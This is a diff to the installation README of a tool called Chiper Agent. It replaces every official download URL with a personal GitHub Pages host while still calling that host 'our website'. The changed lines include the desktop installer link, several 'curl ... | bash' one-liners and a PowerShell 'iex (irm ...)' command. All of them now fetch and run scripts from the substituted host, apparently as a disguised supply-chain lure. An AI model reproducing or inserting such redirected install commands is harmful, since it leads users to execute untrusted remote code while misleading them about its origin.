@@ -10,21 +10,21 @@ Get Chiper Agent up and running in under two minutes!
 
 ## Quick Install
 ### With the Chiper Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the Chiper Desktop installer](https://chiper-agent.Chiper.com/) from our website and run it.
+To easily install the command-line and desktop applications, [download the Chiper Desktop installer](https://iamtubasya.github.io/chiper-agent/) from our website and run it.
 
 ### Without Chiper Desktop:
 For a command-line only install without Chiper Desktop, run:
 
 #### Linux / macOS / WSL2 / Android (Termux)
 ```bash
-curl -fsSL https://chiper-agent.Chiper.com/install.sh | bash
+curl -fsSL https://iamtubasya.github.io/chiper-agent/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://chiper-agent.Chiper.com/install.ps1) 
+iex (irm https://iamtubasya.github.io/chiper-agent/install.ps1) 
 ```
 
 If you want to install & run Chiper Desktop after a command-line only install, simply run
@@ -119,12 +119,12 @@ Running Chiper as a dedicated unprivileged user (e.g. a `chiper` systemd service
 
 2. **As the unprivileged service user**, run the regular installer. It will detect the missing sudo, skip `--with-deps`, and install Chromium into the user's local Playwright cache:
    ```bash
-   curl -fsSL https://chiper-agent.Chiper.com/install.sh | bash
+   curl -fsSL https://iamtubasya.github.io/chiper-agent/install.sh | bash
    ```
 
    If you want to skip the Playwright step entirely — for example because you're running headless and don't need browser automation — pass `--skip-browser`:
    ```bash
-   curl -fsSL https://chiper-agent.Chiper.com/install.sh | bash -s -- --skip-browser
+   curl -fsSL https://iamtubasya.github.io/chiper-agent/install.sh | bash -s -- --skip-browser
    ```
 
 3. **Make `chiper` available to the service user's shells.** The installer writes the launcher to `~/.local/bin/chiper`. System service accounts often have a minimal PATH that doesn't include `~/.local/bin`. Either add it to the user's environment, or symlink the launcher into a system location:
